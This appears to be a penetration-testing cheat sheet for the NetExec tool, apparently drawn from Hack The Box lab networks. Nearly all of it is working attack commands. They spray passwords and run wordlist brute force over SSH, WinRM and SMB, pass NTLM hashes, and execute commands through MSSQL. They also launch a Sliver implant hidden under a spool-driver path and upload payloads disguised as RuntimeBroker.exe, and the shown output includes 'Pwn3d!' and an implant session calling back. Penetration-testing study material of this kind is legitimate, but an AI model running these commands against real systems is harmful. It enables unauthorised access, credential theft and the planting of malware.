# NetExec

### SSH

* attempt ssh authentication to multiple hosts with one set of credentials&#x20;

```
./nxc ssh targets.txt -u james -p password123
./nxc ssh targets.txt -u balthazar -p 'password123'
./nxc ssh targets.txt -u root -p asdfghjkl
```

* attempt ssh auth to any host in a subnet with one set of credentials&#x20;

```
./nxc ssh 172.16.1.0/24 -u james -p password123
```

### WINRM

* attempt winrm authentication to multiple hosts with one set of credentials&#x20;

```
./nxc winrm targets.txt -u balthazar -p 'abc123!!!'
# domain authentication
./nxc winrm targets.txt -u 'HTB.local\balthazar' -p 'abc123!!!' 
./nxc winrm targets.txt -u 'HTB.local\james' -p password123
```

* attempt winrm authentication to a domain with a username and hash

```
./nxc winrm targets.txt -d HTB.local -u blake -H 12f18eteb6f8187fa52f3f729896bbb7
./nxc winrm targets.txt -u Administrator -H b99ed3c3d34c4576bcd33c76420be934
```

* winrm with a single username and a password wordlist

```
./nxc winrm 172.16.1.101 -u dan.hard -p 172.16.1.101/passwordlist.txt 
```

### SMB

* attempt smb authentication to multiple hosts with one set of credentials&#x20;

```
./nxc smb targets.txt -u 'HTB.local\james' -p password123
```

* attempt ssh authentication with a keyfile instead of a password

```
./nxc ssh 172.16.1.0/24 -u root --key-file ./10.10.110.100/ssh/id_rsa -p ''
```

* attempt smb auth to any host in a subnet with anonymous logon&#x20;

```
./nxc smb 172.16.1.0/24 -u anonymous -p ''
```

* smb authentication to a domain with a specific username and attempt a password wordlist

```
./nxc smb 172.16.1.13 -d DANTE.local -u 'gerald' -p /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt 
```

### MSSQL&#x20;

* Access MSSQL and run a command with a password&#x20;

```
./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword-X whoami --local-auth
MSSQL       172.16.1.5      1433   DANTE-SQL01      [*] Windows 10.0 Build 14393 (name:DANTE-SQL01) (domain:DANTE-SQL01)
MSSQL       172.16.1.5      1433   DANTE-SQL01      [+] sophie:thisisagoodpassword(Pwn3d!)
MSSQL       172.16.1.5      1433   DANTE-SQL01      [+] Executed command via mssqlexec
MSSQL       172.16.1.5      1433   DANTE-SQL01      nt service\mssql$sqlexpress
```

* kick off a sliver implant in the background&#x20;

```
./nxc mssql 172.16.1.5 -u sophie -p thisisagoodpassword-X 'cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\security.exe' --local-auth
[*] Session b00d3dc6 dante-dc01 - 10.10.14.3:33086 (DANTE-SQL01) - windows/amd64 - Sun, 19 May 2024 13:48:24 EDT
```

### Put file

<pre><code><strong>./nxc smb 172.16.1.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:d0629f5539666892bf9ba9b34daa125c --put-file /opt/wmiexec2/RuntimeBroker.exe \\xampp\\apache\\bin\\iconv\\RuntimeBroker.exe
</strong><strong>
</strong>./nxc mssql 172.16.1.5 -u sophie -p thisisapassword --put-file /home/ubuntu/Documents/htb/dante/security.exe 'C:\Windows\System32\spool\drivers\color\security.exe' --local-auth

</code></pre>
